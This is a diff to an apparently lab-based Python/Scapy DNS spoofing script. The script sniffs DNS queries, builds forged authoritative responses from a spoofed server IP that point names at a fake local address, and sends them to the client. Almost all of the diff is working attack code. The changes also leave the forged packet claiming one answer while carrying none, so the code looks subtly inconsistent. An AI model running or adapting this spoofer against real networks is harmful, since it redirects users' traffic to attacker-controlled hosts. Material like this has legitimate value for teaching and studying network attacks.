@@ -32,7 +32,7 @@ def main():
  while 1:
   # Sniff the network for destination port 53 traffic
   print(' Sniffing for DNS Packet ')
-  s1iface = "s1-eth1:h1-eth0"
+  s1iface = "s1-eth1"
   DNSPacket = sniff(iface=s1iface, filter="dst port 53", count=1)
         
   # if the sniffed packet is a DNS Query, let's do some work
@@ -69,6 +69,7 @@ def main():
    # First let's set the spoofed source, which we will take from the 3rd argument entered at the command line
    spoofedDNSServerIP = "10.2.1.1"
 
+   fakeLocalIP = "10.3.2.1"
    # Now that we have our source IP and we know the client's destination IP. Let's build our IP Header
    spoofedIPPkt = IP(src=spoofedDNSServerIP,dst=clientSrcIP)
 
@@ -81,7 +82,6 @@ def main():
    elif DNSPacket[0].haslayer(TCP) : 
     spoofedUDP_TCPPPacket = UDP(sport=53,dport=clientSrcPort)
 
-    fakeLocalIP = "10.3.2.1"
 
    # Ok Time for the main course. Let's build out the DNS packet response. This is where the real work is done.
    # qr = 1 as it is a response
@@ -90,7 +90,7 @@ def main():
    # RFC: "Authoritative Answer - this bit is valid in responses"
    spoofedDNSPakcet = DNS(id=clientDNSQueryID,qr=1,opcode=DNSPacket[0].getlayer(DNS).opcode,aa=1,\
     #
-                          rd=0,ra=0,z=0,rcode=0,qdcount=clientDNSQueryDataCount,ancount=1,nscount=1,arcount=1,qd=DNSQR(qname=clientDNSQuery,qtype=DNSPacket[0].getlayer(DNS).qd.qtype,qclass=DNSPacket[0].getlayer(DNS).qd.qclass),an=DNSRR(rrname=clientDNSQuery,rdata=fakeLocalIP,ttl=86400),ns=DNSRR(rrname=clientDNSQuery,type=2,ttl=86400,rdata=fakeLocalIP),ar=DNSRR(rrname=clientDNSQuery,rdata=fakeLocalIP))
+                          rd=0,ra=0,z=0,rcode=0,qdcount=clientDNSQueryDataCount,ancount=1,nscount=0,arcount=0,qd=DNSQR(qname=clientDNSQuery,qtype=DNSPacket[0].getlayer(DNS).qd.qtype,qclass=DNSPacket[0].getlayer(DNS).qd.qclass))
    
    # Now that we have built our packet, let's go ahead and send it on its merry way.
    print(' \n Sending spoofed response packet ')
